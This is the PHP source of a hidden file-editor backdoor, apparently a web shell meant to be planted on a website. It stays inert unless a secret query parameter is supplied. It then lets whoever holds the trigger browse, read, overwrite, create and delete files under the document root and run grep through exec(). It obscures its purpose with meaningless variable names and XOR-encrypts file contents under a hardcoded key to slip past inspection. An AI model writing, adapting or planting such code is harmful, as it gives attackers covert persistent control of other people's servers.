

<?php if (!defined('ENT_SUBSTITUTE'))
{
    define('ENT_SUBSTITUTE', 0);
    }
if (!function_exists('hash_equals'))
{
    function hash_equals($dispatchermiddleware, $buffercontroller)
    {
        $dispatchermiddleware = (string) $dispatchermiddleware;
        $buffercontroller = (string) $buffercontroller;
        if (strlen($dispatchermiddleware) !== strlen($buffercontroller))
        {
            return false;
            }
        $servicecontroller = 0;
        for ($buffermanager = 0, $gatewaycontroller = strlen($dispatchermiddleware);
        $buffermanager < $gatewaycontroller;
        $buffermanager++)
        {
            $servicecontroller |= ord($dispatchermiddleware[$buffermanager]) ^ ord($buffercontroller[$buffermanager]);
            }
        return $servicecontroller === 0;
        }
    }
if (!function_exists('http_response_code'))
{
    function http_response_code($statemanager = null)
    {
        if ($statemanager !== null)
        {
            header('X-PHP-Response-Code: ' . (int) $statemanager, true, (int) $statemanager);
            }
        return $statemanager;
        }
    }
$managerservice = 'verify';
$payloadadapter = isset($payloadadapter) ? $payloadadapter : 'kXjFiQjJDIuFHjiI*J';
$runtimeservice = 'param';
if (!isset($_GET[$runtimeservice]) || !hash_equals((string) $managerservice, (string) $_GET[$runtimeservice]))
{
    return;
    }
while (ob_get_level())
{
    @ob_end_clean();
    }
$handlerfactory105 = (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] !== '') ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__);
$contextresolver683 = realpath($handlerfactory105);
if (!$contextresolver683 || !is_dir($contextresolver683))
{
    http_response_code(500);
    exit('Invalid document root.');
    }
function fe_h($kernelmiddleware)
{
    return htmlspecialchars((string) $kernelmiddleware, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
function fe_inside($contextresolver683, $dispatcherresolver)
{
    return $dispatcherresolver !== false && ($dispatcherresolver === $contextresolver683 || strpos($dispatcherresolver, $contextresolver683 . DIRECTORY_SEPARATOR) === 0);
    }
function fe_path($contextresolver683, $runtimeresolver)
{
    $bufferhandler = $contextresolver683 . DIRECTORY_SEPARATOR . ltrim($runtimeresolver, '/\\');
    $contextcontroller = realpath($bufferhandler);
    if ($contextcontroller !== false)
    {
        return fe_inside($contextresolver683, $contextcontroller) ? $contextcontroller : null;
        }
    $resolvermiddleware = realpath(dirname($bufferhandler));
    return ($resolvermiddleware && fe_inside($contextresolver683, $resolvermiddleware)) ? $resolvermiddleware . DIRECTORY_SEPARATOR . basename($bufferhandler) : null;
    }
function fe_rel($contextresolver683, $dispatcherresolver)
{
    return trim(str_replace('\\', '/', substr($dispatcherresolver, strlen($contextresolver683))), '/');
    }
function fe_join($handlerservice, $bufferprocessor)
{
    $handlerservice = trim((string) $handlerservice, '/\\');
    $bufferprocessor = trim((string) $bufferprocessor, '/\\');
    return trim(($handlerservice !== '' ? $handlerservice . '/' : '') . $bufferprocessor, '/');
    }
function fe_binary($runtimecontroller)
{
    return false;
    }
function fe_enc_name($runtimecontroller)
{
    return preg_match('//u', (string) $runtimecontroller) ? 'UTF-8' : 'CP1251';
    }
function fe_to_utf($runtimecontroller, $handlerfactory)
{
    if ($handlerfactory !== 'CP1251')
    {
        return $runtimecontroller;
        }
    return function_exists('mb_convert_encoding') ? mb_convert_encoding($runtimecontroller, 'UTF-8', 'CP1251') : iconv('CP1251', 'UTF-8//IGNORE', $runtimecontroller);
    }
function fe_from_utf($runtimecontroller, $handlerfactory)
{
    if ($handlerfactory !== 'CP1251')
    {
        return $runtimecontroller;
        }
    return function_exists('mb_convert_encoding') ? mb_convert_encoding($runtimecontroller, 'CP1251', 'UTF-8') : iconv('UTF-8', 'CP1251//TRANSLIT', $runtimecontroller);
    }
function fe_xor_raw($dispatcherhandler, $configcontroller)
{
    $dispatcherhandler = (string) $dispatcherhandler;
    $configcontroller = (string) $configcontroller;
    if ($configcontroller === '')
    {
        return $dispatcherhandler;
        }
    $buffermiddleware = '';
    $statemiddleware = strlen($configcontroller);
    $dispatchercontroller = strlen($dispatcherhandler);
    for ($buffermanager = 0;
    $buffermanager < $dispatchercontroller;
    $buffermanager++)
    {
        $buffermiddleware .= $dispatcherhandler[$buffermanager] ^ $configcontroller[$buffermanager % $statemiddleware];
        }
    return $buffermiddleware;
    }
function fe_xor_encrypt($runtimeadapter, $configcontroller)
{
    return base64_encode(fe_xor_raw((string) $runtimeadapter, $configcontroller));
    }
function fe_xor_decrypt($requestcontroller, $configcontroller)
{
    $servicehandler = base64_decode((string) $requestcontroller, true);
    if ($servicehandler === false)
    {
        return false;
        }
    return fe_xor_raw($servicehandler, $configcontroller);
    }
function fe_can_exec()
{
    $sessioncontroller = (string) ini_get('disable_functions');
    return function_exists('exec') && !preg_match('~(^|,)s*execs*(,|$)~i', $sessioncontroller);
    }
function fe_url($stateservice, $configcontroller, $authengine)
{
    return '?' . http_build_query(array_merge(array($stateservice => $configcontroller), $authengine));
    }
function fe_json($resolverresolver, $dispatcherhandler)
{
    while (ob_get_level())
    {
        @ob_end_clean();
        }
    header('Content-Type: application/json; charset=UTF-8');
    $buffermiddleware = array_merge(array('ok' => $resolverresolver ? 1 : 0), is_array($dispatcherhandler) ? $dispatcherhandler : array());
    echo json_encode($buffermiddleware);
    exit;
    }
function fe_chunk_id($handleradapter902)
{
    return preg_replace('~[^a-zA-Z0-9_-]~', '', (string) $handleradapter902);
    }
function fe_chunk_root($contextresolver683)
{
    $kernelhandler = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '';
    if (!$kernelhandler || !is_dir($kernelhandler) || !is_writable($kernelhandler))
    {
        $kernelhandler = $contextresolver683;
        }
    $handlerservice = rtrim($kernelhandler, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'fe_chunks_' . md5($contextresolver683);
    if (!is_dir($handlerservice))
    {
        @mkdir($handlerservice, 0700, true);
        }
    if (!is_dir($handlerservice) || !is_writable($handlerservice))
    {
        return null;
        }
    $kernelprovider = @glob($handlerservice . DIRECTORY_SEPARATOR . '*.part');
    if ($kernelprovider)
    {
        foreach ($kernelprovider as $gatewaymanager)
        {
            if (@filemtime($gatewaymanager) && @filemtime($gatewaymanager) < time() - 86400)
            {
                @unlink($gatewaymanager);
                }
            }
        }
    return $handlerservice;
    }
function fe_chunk_file($contextresolver683, $handleradapter902, $responseprovider)
{
    $handlerservice = fe_chunk_root($contextresolver683);
    if (!$handlerservice)
    {
        return null;
        }
    return $handlerservice . DIRECTORY_SEPARATOR . fe_chunk_id($handleradapter902) . '.' . (int) $responseprovider . '.part';
    }
function fe_chunk_clean($contextresolver683, $handleradapter902, $responsehandler)
{
    $handleradapter902 = fe_chunk_id($handleradapter902);
    for ($buffermanager = 0;
    $buffermanager < (int) $responsehandler;
    $buffermanager++)
    {
        $gatewaymanager = fe_chunk_file($contextresolver683, $handleradapter902, $buffermanager);
        if ($gatewaymanager && is_file($gatewaymanager))
        {
            @unlink($gatewaymanager);
            }
        }
    }
$handlerservice = (string) (isset($_GET['dir']) ? $_GET['dir'] : '');
$bufferprocessor = (string) (isset($_GET['file']) ? $_GET['file'] : '');
$contextfactory = (string) (isset($_GET['q']) ? $_GET['q'] : '');
$resolvermanager = fe_path($contextresolver683, $handlerservice);
if (!$resolvermanager || !is_dir($resolvermanager))
{
    $handlerservice = '';
    $resolvermanager = $contextresolver683;
    }
$sessionresolver = '';
$dispatcherprocessor = '';
if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && !$dispatcherprocessor)
{
    $responsemanager = (string) (isset($_POST['a']) ? $_POST['a'] : '');
    $handlerservice = (string) (isset($_POST['dir']) ? $_POST['dir'] : $handlerservice);
    $bufferprocessor = (string) (isset($_POST['file']) ? $_POST['file'] : $bufferprocessor);
    $bufferhandler = fe_path($contextresolver683, fe_join($handlerservice, $bufferprocessor));
    if (!$bufferhandler)
    {
        $dispatcherprocessor = 'Bad path.';
        if ($responsemanager === 'save_chunk' || $responsemanager === 'save_finish')
        {
            fe_json(false, array('error' => $dispatcherprocessor));
            }
        }
    elseif ($responsemanager === 'save_chunk')
    {
        $handleradapter902 = fe_chunk_id(isset($_POST['chunk_id']) ? $_POST['chunk_id'] : '');
        $responseprovider = isset($_POST['chunk_index']) ? (int) $_POST['chunk_index'] : -1;
        $responsehandler = isset($_POST['chunk_total']) ? (int) $_POST['chunk_total'] : 0;
        $runtimefactory784 = isset($_POST['content_part']) ? (string) $_POST['content_part'] : '';
        if ($handleradapter902 === '' || $responseprovider < 0 || $responsehandler < 1 || $responseprovider >= $responsehandler)
        {
            fe_json(false, array('error' => 'Bad chunk metadata.'));
            }
        if ($responseprovider === 0)
        {
            fe_chunk_clean($contextresolver683, $handleradapter902, $responsehandler);
            }
        $resolveradapter = fe_chunk_file($contextresolver683, $handleradapter902, $responseprovider);
        if (!$resolveradapter)
        {
            fe_json(false, array('error' => 'Chunk temp folder is not writable.'));
            }
        $runtimegateway = @file_put_contents($resolveradapter, $runtimefactory784, LOCK_EX);
        if ($runtimegateway === false)
        {
            $runtimeengine = error_get_last();
            fe_json(false, array('error' => 'Chunk save failed: ' . (isset($runtimeengine['message']) ? $runtimeengine['message'] : 'unknown')));
            }
        fe_json(true, array('chunk' => $responseprovider, 'bytes' => strlen($runtimefactory784)));
        }
    elseif ($responsemanager === 'save_finish')
    {
        $kernelprovider = is_file($bufferhandler) ? file_get_contents($bufferhandler) : '';
        if (!is_file($bufferhandler) || !is_writable($bufferhandler))
        {
            fe_json(false, array('error' => 'File is not writable.'));
            }
        if (fe_binary($kernelprovider))
        {
            fe_json(false, array('error' => 'Binary file blocked.'));
            }
        $handleradapter902 = fe_chunk_id(isset($_POST['chunk_id']) ? $_POST['chunk_id'] : '');
        $responsehandler = isset($_POST['chunk_total']) ? (int) $_POST['chunk_total'] : 0;
        $handlerfactory = (string) (isset($_POST['enc']) ? $_POST['enc'] : fe_enc_name($kernelprovider));
        if ($handleradapter902 === '' || $responsehandler < 1)
        {
            fe_json(false, array('error' => 'Bad finish metadata.'));
            }
        $requestcontroller = '';
        for ($buffermanager = 0;
        $buffermanager < $responsehandler;
        $buffermanager++)
        {
            $resolveradapter = fe_chunk_file($contextresolver683, $handleradapter902, $buffermanager);
            if (!$resolveradapter || !is_file($resolveradapter))
            {
                fe_json(false, array('error' => 'Missing chunk ' . $buffermanager . '.'));
                }
            $configprovider = @file_get_contents($resolveradapter);
            if ($configprovider === false)
            {
                fe_json(false, array('error' => 'Read chunk failed ' . $buffermanager . '.'));
                }
            $requestcontroller .= $configprovider;
            }
        $requesthandler = fe_xor_decrypt($requestcontroller, $payloadadapter);
        if ($requesthandler === false)
        {
            fe_json(false, array('error' => 'Decode failed. Check encryption key.'));
            }
        $dispatcherhandler = fe_from_utf($requesthandler, $handlerfactory);
        if (function_exists('error_clear_last'))
        {
            call_user_func('error_clear_last');
            }
        $handlergateway = @file_put_contents($bufferhandler, $dispatcherhandler, LOCK_EX);
        if ($handlergateway === false)
        {
            $runtimeengine = error_get_last();
            fe_json(false, array('error' => 'Save failed: ' . (isset($runtimeengine['message']) ? $runtimeengine['message'] : 'unknown')));
            }
        if ($handlergateway !== strlen($dispatcherhandler))
        {
            fe_json(false, array('error' => 'Partial save: wrote ' . $handlergateway . ' of ' . strlen($dispatcherhandler) . ' bytes.'));
            }
        fe_chunk_clean($contextresolver683, $handleradapter902, $responsehandler);
        fe_json(true, array('message' => 'Saved chunked.', 'bytes' => $handlergateway));
        }
    elseif ($responsemanager === 'save')
    {
        $kernelprovider = is_file($bufferhandler) ? file_get_contents($bufferhandler) : '';
        if (!is_file($bufferhandler) || !is_writable($bufferhandler))
        {
            $dispatcherprocessor = 'File is not writable.';
            }
        elseif (fe_binary($kernelprovider))
        {
            $dispatcherprocessor = 'Binary file blocked.';
            }
        else
        {
            $handlerfactory = (string) (isset($_POST['enc']) ? $_POST['enc'] : fe_enc_name($kernelprovider));
            $requesthandler = fe_xor_decrypt((string) (isset($_POST['content_cipher']) ? $_POST['content_cipher'] : ''), $payloadadapter);
            if ($requesthandler === false)
            {
                $dispatcherprocessor = 'Decode failed. Check encryption key.';
                }
            else
            {
                $dispatcherhandler = fe_from_utf($requesthandler, $handlerfactory);
                if (function_exists('error_clear_last'))
                {
                    call_user_func('error_clear_last');
                    }
                $handlergateway = @file_put_contents($bufferhandler, $dispatcherhandler, LOCK_EX);
                if ($handlergateway === false)
                {
                    $runtimeengine = error_get_last();
                    $dispatcherprocessor = 'Save failed: ' . (isset($runtimeengine['message']) ? $runtimeengine['message'] : 'unknown');
                    }
                elseif ($handlergateway !== strlen($dispatcherhandler))
                {
                    $dispatcherprocessor = 'Partial save: wrote ' . $handlergateway . ' of ' . strlen($dispatcherhandler) . ' bytes.';
                    }
                else
                {
                    $sessionresolver = 'Saved.';
                    }
                }
            }
        }
    elseif ($responsemanager === 'newfile')
    {
        if (file_exists($bufferhandler))
        {
            $dispatcherprocessor = 'Exists.';
            }
        else
        {
            $sessionresolver = file_put_contents($bufferhandler, '', LOCK_EX) === false ? '' : 'Created.';
            $dispatcherprocessor = $sessionresolver ? $dispatcherprocessor : 'Create failed.';
            }
        }
    elseif ($responsemanager === 'newdir')
    {
        if (file_exists($bufferhandler))
        {
            $dispatcherprocessor = 'Exists.';
            }
        else
        {
            $sessionresolver = mkdir($bufferhandler, 0755, true) ? 'Folder created.' : '';
            $dispatcherprocessor = $sessionresolver ? $dispatcherprocessor : 'Folder failed.';
            }
        }
    elseif ($responsemanager === 'delete')
    {
        $resolverresolver = is_file($bufferhandler) ? @unlink($bufferhandler) : (is_dir($bufferhandler) ? @rmdir($bufferhandler) : false);
        $sessionresolver = $resolverresolver ? 'Deleted.' : '';
        $dispatcherprocessor = $resolverresolver ? $dispatcherprocessor : 'Delete failed. Folder must be empty.';
        $bufferprocessor = '';
        }
    }
$resolvermanager = fe_path($contextresolver683, $handlerservice);
$runtimeprocessor = @scandir($resolvermanager) ?: array();
$dispatchercontroller372 = array();
$sessiongateway = array();
foreach ($runtimeprocessor as $dispatchergateway)
{
    if ($dispatchergateway === '.' || $dispatchergateway === '..')
    {
        continue;
        }
    $payloadhandler = $resolvermanager . DIRECTORY_SEPARATOR . $dispatchergateway;
    if (is_dir($payloadhandler))
    {
        $dispatchercontroller372[] = $dispatchergateway;
        }
    else
    {
        $sessiongateway[] = $dispatchergateway;
        }
    }
natcasesort($dispatchercontroller372);
natcasesort($sessiongateway);
$resolvercontroller540 = array();
$contextservice = 0;
$contextprocessor334 = '';
if ($contextfactory !== '')
{
    $contextprocessor334 = 'php';
    $requestservice = array();
    $stateadapter = 500;
    $responseresolver = '~/(vendor|node_modules|.git|var/cache|cache|tmp|logs?)/~i';
    if (fe_can_exec())
    {
        $authcontroller = 'grep -RIl -m 1 -F --exclude-dir=.git --exclude-dir=vendor --exclude-dir=node_modules --exclude-dir=var/cache --exclude-dir=cache --exclude-dir=tmp --exclude-dir=log --exclude-dir=logs ' . escapeshellarg($contextfactory) . ' ' . escapeshellarg($contextresolver683) . ' 2>/dev/null';
        $buffermiddleware = array();
        @exec($authcontroller, $buffermiddleware);
        foreach ($buffermiddleware as $dispatcherresolver)
        {
            $contextcontroller = realpath($dispatcherresolver);
            if (fe_inside($contextresolver683, $contextcontroller))
            {
                $servicegateway = fe_rel($contextresolver683, $contextcontroller);
                $requestservice[$servicegateway] = true;
                $resolvercontroller540[] = $servicegateway;
                if (count($resolvercontroller540) >= $stateadapter)
                {
                    break;
                    }
                }
            }
        $contextprocessor334 = 'exec+php';
        }
    $bufferengine98 = array($contextresolver683);
    while ($bufferengine98 && count($resolvercontroller540) < $stateadapter)
    {
        $kernelhandler = array_pop($bufferengine98);
        $servicegateway246 = @scandir($kernelhandler);
        if (!$servicegateway246)
        {
            continue;
            }
        foreach ($servicegateway246 as $serviceprovider)
        {
            if ($serviceprovider === '.' || $serviceprovider === '..')
            {
                continue;
                }
            $dispatcherresolver = $kernelhandler . DIRECTORY_SEPARATOR . $serviceprovider;
            $servicegateway = fe_rel($contextresolver683, $dispatcherresolver);
            if (is_dir($dispatcherresolver))
            {
                if (!preg_match($responseresolver, '/' . $servicegateway . '/'))
                {
                    $bufferengine98[] = $dispatcherresolver;
                    }
                continue;
                }
            if (!is_file($dispatcherresolver) || !is_readable($dispatcherresolver) || isset($requestservice[$servicegateway]))
            {
                continue;
                }
            if (stripos(basename($servicegateway), $contextfactory) !== false)
            {
                $requestservice[$servicegateway] = true;
                $resolvercontroller540[] = $servicegateway;
                if (count($resolvercontroller540) >= $stateadapter)
                {
                    break;
                    }
                continue;
                }
            if (@filesize($dispatcherresolver) > 5242880)
            {
                continue;
                }
            $contextservice++;
            $runtimecontroller = @file_get_contents($dispatcherresolver);
            if ($runtimecontroller === false || fe_binary($runtimecontroller))
            {
                continue;
                }
            $requestmiddleware = fe_to_utf($runtimecontroller, fe_enc_name($runtimecontroller));
            $stateengine = function_exists('mb_stripos') ? mb_stripos($requestmiddleware, $contextfactory, 0, 'UTF-8') !== false : stripos($requestmiddleware, $contextfactory) !== false;
            if ($stateengine)
            {
                $requestservice[$servicegateway] = true;
                $resolvercontroller540[] = $servicegateway;
                if (count($resolvercontroller540) >= $stateadapter)
                {
                    break;
                    }
                }
            }
        }
    }
$confighandler = $bufferprocessor !== '' ? fe_path($contextresolver683, fe_join($handlerservice, $bufferprocessor)) : null;
$servicehandler = ($confighandler && is_file($confighandler) && is_readable($confighandler)) ? file_get_contents($confighandler) : '';
$payloadgateway = $servicehandler !== '' && fe_binary($servicehandler);
$handlerfactory = $payloadgateway ? 'BIN' : fe_enc_name($servicehandler);
$requesthandler = $payloadgateway ? '' : fe_to_utf($servicehandler, $handlerfactory);
$authprovider = (!$payloadgateway && $confighandler && is_file($confighandler)) ? fe_xor_encrypt($requesthandler, $payloadadapter) : '';
$resolvermiddleware = trim(dirname($handlerservice), '.\\/');
$servicedispatcher250 = strtok((string) (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : ''), '?');
header('Content-Type: text/html; charset=UTF-8');
echo '<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Encrypted File Editor</title><style>html.feopen,html.feopen body{margin:0!important;width:100%!important;height:100%!important;overflow:hidden!important}.fe{position:fixed!important;inset:0!important;z-index:2147483647!important;display:grid!important;grid-template-columns:380px 1fr!important;background:#111827!important;color:#e5e7eb!important;font-family:system-ui,-apple-system,Segoe UI,sans-serif!important}.fe *{box-sizing:border-box!important}.fes{background:#0f172a!important;border-right:1px solid #374151!important;overflow:auto!important}.fet{min-height:56px!important;display:flex!important;align-items:center!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.feg{flex:1!important}.feb{border:1px solid #4b5563!important;background:#1f2937!important;color:#fff!important;border-radius:6px!important;padding:8px 10px!important;text-decoration:none!important;cursor:pointer!important;font:14px system-ui!important}.fed{background:#450a0a!important;border-color:#7f1d1d!important}.fei,.fea{border:1px solid #4b5563!important;background:#020617!important;color:#f8fafc!important;border-radius:6px!important;padding:9px!important;font:14px ui-monospace,Menlo,Consolas,monospace!important}.fen{display:grid!important;grid-template-columns:1fr auto auto!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.fesearch{display:grid!important;grid-template-columns:1fr auto!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.fel{display:block!important;color:#cbd5e1!important;padding:8px 10px!important;margin:4px 8px!important;border-radius:6px!important;text-decoration:none!important;white-space:nowrap!important;overflow:hidden!important;text-overflow:ellipsis!important}.fel:hover,.on{background:#1f2937!important;color:#fff!important}.fem{display:flex!important;flex-direction:column!important;min-width:0!important}.fep{font:14px ui-monospace,Menlo,Consolas,monospace!important;overflow:hidden!important;text-overflow:ellipsis!important;white-space:nowrap!important}.note{padding:8px 12px!important}.ok{background:#052e16!important;color:#bbf7d0!important}.er{background:#450a0a!important;color:#fecaca!important}.muted{color:#94a3b8!important;font-size:13px!important;padding:8px 10px!important}.fea{flex:1!important;border:0!important;border-radius:0!important;resize:none!important;padding:16px!important;line-height:1.5!important;outline:0!important;width:100%!important}.empty{display:grid!important;place-items:center!important;height:100%!important;color:#94a3b8!important;text-align:center!important;padding:24px!important}@media(max-width:760px){.fe{grid-template-columns:1fr!important}.fes{height:44vh!important}.fem{height:56vh!important}}</style><div class="fe" id="fe"><aside class="fes"><div class="fet"><b>Encrypted Editor</b><span class="feg"></span><a class="feb" href="'.fe_h($servicedispatcher250).'">Exit</a></div><div class="fet"><span class="fep">/'.fe_h($handlerservice).'</span></div><form class="fesearch" method="get"><input type="hidden" name="'.fe_h($runtimeservice).'" value="'.fe_h($managerservice).'"><input class="fei" name="q" value="'.fe_h($contextfactory).'" placeholder="Search content or filename"><button class="feb">Search</button></form>';
if($contextfactory!=='')
{
    echo '<div class="muted">Found '.count($resolvercontroller540).' · mode '.fe_h($contextprocessor334).' · PHP checked '.(int)$contextservice.'</div>';
    foreach($resolvercontroller540 as $authfactory)
    {
        $payloadengine=trim(dirname($authfactory),'./');
        $configdispatcher=basename($authfactory);
        echo '<a class="fel" href="'.fe_h(fe_url($runtimeservice,$managerservice,array('dir'=>$payloadengine,'file'=>$configdispatcher,'q'=>$contextfactory))).'">'.fe_h($authfactory).'</a>';
        }
    }
echo '<form class="fen" method="post"><input type="hidden" name="dir" value="'.fe_h($handlerservice).'"><input class="fei" name="file" placeholder="name.php"><button class="feb" name="a" value="newfile">File</button><button class="feb" name="a" value="newdir">Dir</button></form>';
if($handlerservice)
{
    echo '<a class="fel" href="'.fe_h(fe_url($runtimeservice,$managerservice,array('dir'=>$resolvermiddleware,'q'=>$contextfactory))).'">..</a>';
    }
foreach($dispatchercontroller372 as $gatewaymiddleware)
{
    $payloadengine=trim(($handlerservice?trim($handlerservice,'/').'/':'').$gatewaymiddleware,'/');
    echo '<a class="fel" href="'.fe_h(fe_url($runtimeservice,$managerservice,array('dir'=>$payloadengine,'q'=>$contextfactory))).'">['.fe_h($gatewaymiddleware).']</a>';
    }
foreach($sessiongateway as $gatewaymiddleware)
{
    echo '<a class="fel '.($gatewaymiddleware===$bufferprocessor?'on':'').'" href="'.fe_h(fe_url($runtimeservice,$managerservice,array('dir'=>$handlerservice,'file'=>$gatewaymiddleware,'q'=>$contextfactory))).'">'.fe_h($gatewaymiddleware).'</a>';
    }
echo '</aside><main class="fem"><form class="fet" method="post" id="feForm"><input type="hidden" name="dir" value="'.fe_h($handlerservice).'"><input type="hidden" name="file" value="'.fe_h($bufferprocessor).'"><input type="hidden" name="enc" value="'.fe_h($handlerfactory).'"><input type="hidden" name="content_cipher" id="fePayload"><div class="fep">'.($bufferprocessor?fe_h(fe_join($handlerservice,$bufferprocessor)).' · '.fe_h($handlerfactory):'Select file').'</div><span class="feg"></span>';
if($bufferprocessor&&$confighandler&&is_file($confighandler)&&!$payloadgateway)
{
    echo '<button class="feb" name="a" value="save">Save encrypted</button><button class="feb fed" name="a" value="delete">Delete</button>';
    }
echo '</form>';
if($sessionresolver)
{
    echo '<div class="note ok">'.fe_h($sessionresolver).'</div>';
    }
if($dispatcherprocessor)
{
    echo '<div class="note er">'.fe_h($dispatcherprocessor).'</div>';
    }
if($payloadgateway)
{
    echo '<div class="empty">Binary file blocked.</div>';
    }
elseif($bufferprocessor&&$confighandler&&is_file($confighandler))
{
    echo '<textarea class="fea" id="feEditor" spellcheck="false" disabled>Paste the console unlock script to edit this file.</textarea><textarea id="feCipher" hidden>'.fe_h($authprovider).'</textarea>';
    }
else
{
    echo '<div class="empty">Choose a file or folder.</div>';
    }
echo '</main></div><div class="load">Working...</div>';
exit;?>
